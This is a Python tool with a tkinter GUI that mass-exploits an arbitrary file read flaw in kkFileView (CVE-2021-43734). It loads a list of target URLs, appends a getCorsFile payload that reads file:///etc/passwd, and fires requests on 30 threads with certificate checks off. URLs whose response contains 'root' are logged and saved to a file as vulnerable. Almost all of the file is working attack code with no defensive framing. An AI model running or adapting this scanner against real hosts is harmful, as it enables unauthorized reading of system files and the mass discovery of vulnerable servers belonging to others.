import requests
import json
from tkinter import *
from PIL.ImageTk import PhotoImage
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def kkFileView_readfile_CVE_2021_43734_exp(url):
    poc = r"""/getCorsFile?urlPath=file:///etc/passwd"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "root" in res.text:
            kkFileView_readfile_CVE_2021_43734_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
            kkFileView_readfile_CVE_2021_43734_text.see(END)
            with open("[exists]kkFileView_readfile_CVE_2021_43734_url.txt","a+") as f:
                f.write(url + "\n")
        else:
            kkFileView_readfile_CVE_2021_43734_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
            kkFileView_readfile_CVE_2021_43734_text.see(END)
    except Exception as err:
        kkFileView_readfile_CVE_2021_43734_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        kkFileView_readfile_CVE_2021_43734_text.see(END)
def get_kkFileView_readfile_CVE_2021_43734_addr():
    with open("corrected url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def kkFileView_readfile_CVE_2021_43734_gui():
    kkFileView_readfile_CVE_2021_43734 = Toplevel()
    kkFileView_readfile_CVE_2021_43734.geometry("1035x455")
    kkFileView_readfile_CVE_2021_43734.title("kkFileView getCorsFile arbitrary file read [auto-muti-exp]")
    kkFileView_readfile_CVE_2021_43734.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    kkFileView_readfile_CVE_2021_43734.tk.call('wm', 'iconphoto', kkFileView_readfile_CVE_2021_43734._w, logo)
    global kkFileView_readfile_CVE_2021_43734_text
    kkFileView_readfile_CVE_2021_43734_text = scrolledtext.ScrolledText(kkFileView_readfile_CVE_2021_43734,width=123, height=25)
    kkFileView_readfile_CVE_2021_43734_text.grid(row=0, column=0, padx=10, pady=10)
    kkFileView_readfile_CVE_2021_43734_text.see(END)
    addrs = get_kkFileView_readfile_CVE_2021_43734_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(kkFileView_readfile_CVE_2021_43734_exp, addr)
    kkFileView_readfile_CVE_2021_43734.mainloop()